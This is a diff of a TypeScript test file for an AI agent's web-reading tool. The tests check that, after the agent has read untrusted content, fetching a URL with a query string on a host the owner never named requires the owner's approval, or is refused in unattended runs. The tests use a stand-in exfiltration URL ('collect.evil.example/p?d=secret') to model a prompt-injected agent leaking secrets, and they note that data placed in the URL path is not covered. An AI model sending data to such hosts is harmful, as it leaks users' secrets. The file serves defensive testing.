@@ -18,6 +18,7 @@ vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));
 
 import { Agent } from '../../core/agent.js';
 import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
+import { ConversationLatch } from '../../core/conversation-latch.js';
 import { flattenPrompt } from '../../core/prompt-value.js';
 import { createWebSearchTool, readUrlHasQuery } from './web-search-tool.js';
 import type { SearchProvider } from './search-provider.js';
@@ -36,7 +37,6 @@ function webResearch(): ToolEntry & { reads: string[] } {
   } as unknown as ToolEntry & { reads: string[] };
 }
 
-const latch = (set: boolean) => ({ isSet: () => set, set: () => {} });
 const owner = (...texts: string[]): OwnerKnownTargets => OwnerKnownTargets.of({ ownerTexts: () => texts });
 
 function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
@@ -48,6 +48,13 @@ function agentOf(over: Record<string, unknown>): Agent {
   return new Agent({ name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en', ...over } as ConstructorParameters<typeof Agent>[0]);
 }
 
+/** An agent whose conversation already took in foreign content, as a resumed thread with the record set does. */
+function taintedAgentOf(over: Record<string, unknown>): Agent {
+  const agent = agentOf({ conversationLatch: ConversationLatch.detached(), ...over });
+  agent.restoreConversationTaint();
+  return agent;
+}
+
 const read = (agent: Agent, url: string): Promise<Result> =>
   (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `t${Math.random()}`, name: 'web_research', input: { action: 'read', url } });
 
@@ -55,7 +62,7 @@ describe('a read URL with a query, after foreign content', () => {
   it('is asked about in the owner\'s chat, names the host, and is not read without a yes', async () => {
     const tool = webResearch();
     const ask = asker('Deny');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('look up the weather'), conversationLatch: latch(true) });
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('look up the weather') });
     const result = await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(ask.asked).toHaveLength(1);
     expect(ask.asked[0]).toContain('"collect.evil.example"');
@@ -66,15 +73,17 @@ describe('a read URL with a query, after foreign content', () => {
   it('is read after a yes', async () => {
     const tool = webResearch();
     const ask = asker('Allow');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('nothing named'), conversationLatch: latch(true) });
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('nothing named') });
     await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(ask.asked).toHaveLength(1);
     expect(tool.reads).toEqual(['https://collect.evil.example/p?d=secret']);
   });
 
-  it('is refused in a run nobody watches, and nothing is read', async () => {
+  it('is refused in a run nobody watches, also a headless one with no latch record, and nothing is read', async () => {
     const tool = webResearch();
-    const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, ownerKnown: owner(), conversationLatch: latch(true) });
+    // A headless workflow step: no conversation latch object at all, only the run's own flags.
+    const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, ownerKnown: owner() });
+    agent.noteUntrustedData();
     const result = await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(tool.reads).toEqual([]);
     expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
@@ -83,7 +92,7 @@ describe('a read URL with a query, after foreign content', () => {
   it('CONTROL: on a host the owner named is read without a question', async () => {
     const tool = webResearch();
     const ask = asker('Deny');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('check https://shop.example.ch for prices'), conversationLatch: latch(true) });
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('check https://shop.example.ch for prices') });
     await read(agent, 'https://shop.example.ch/search?q=shoes');
     expect(ask.asked).toEqual([]);
     expect(tool.reads).toEqual(['https://shop.example.ch/search?q=shoes']);
@@ -91,25 +100,31 @@ describe('a read URL with a query, after foreign content', () => {
 });
 
 describe('what stays a plain read', () => {
-  it('a URL with a query on a conversation without foreign content: no question', async () => {
+  it('a URL with a query on a conversation without foreign content: no question, though the read itself arms the latch', async () => {
     const tool = webResearch();
     const ask = asker('Deny');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch(false) });
+    const latch = ConversationLatch.detached();
+    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch });
     await read(agent, 'https://collect.evil.example/p?d=x');
     expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
+    // The read took in foreign content, so the NEXT one is checked.
+    expect(latch.isSet()).toBe(true);
+    await read(agent, 'https://collect.evil.example/p?d=y');
+    expect(ask.asked).toHaveLength(1);
     expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
   });
 
   it('a URL without a query after foreign content: no question (data in the path is not covered)', async () => {
     const tool = webResearch();
     const ask = asker('Deny');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch(true) });
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     await read(agent, 'https://collect.evil.example/secret-in-path#frag=x');
     expect(ask.asked).toEqual([]);
     expect(tool.reads).toEqual(['https://collect.evil.example/secret-in-path#frag=x']);
   });
 
-  it('a search after foreign content: no question, even when the input also carries a URL with a query', async () => {
+  it('a search is never declared as a target, even when its input also carries a URL with a query', async () => {
     const real = createWebSearchTool({} as SearchProvider);
     // Even with a URL that carries a query: only `read` fetches it.
     expect(real.sendTargetsWhenLatched?.({ action: 'search', query: 'x', url: 'https://collect.evil.example/?d=x' } as never)).toBeNull();
@@ -129,7 +144,7 @@ describe('readUrlHasQuery', () => {
   it('an unparseable read URL after foreign content is refused as unreadable, as an address and not a recipient', async () => {
     const tool = webResearch();
     const ask = asker('Allow');
-    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch(true) });
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
     const result = await read(agent, 'not a url');
     expect(ask.asked).toEqual([]);
     expect(tool.reads).toEqual([]);
